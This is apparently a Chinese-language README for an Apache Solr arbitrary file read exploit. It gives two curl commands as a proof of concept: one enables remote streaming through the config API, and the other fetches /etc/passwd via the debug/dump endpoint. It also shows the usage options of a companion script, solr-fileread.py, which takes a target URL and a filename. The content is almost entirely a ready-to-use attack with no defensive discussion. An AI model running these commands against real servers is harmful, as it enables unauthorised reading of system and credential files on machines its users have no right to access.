# apache Solr 任意文件读取漏洞

## 漏洞POC

```bash
curl -d '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}' http://host:port/solr/{corename}/config -H 'Content-type:application/json'

curl "http://host:port/solr/{corename}/debug/dump?param=ContentStreams" -F "stream.url=file:///etc/passwd"
```

## 脚本使用

python3 solr-fileread.py --help

Usage: solr-fileread.py [OPTIONS]

Options:
  --target TEXT    Target URL; Example:http://ip:port。
  --filename TEXT  Target File; Example:/etc/passwd。
  --help           Show this message and exit.

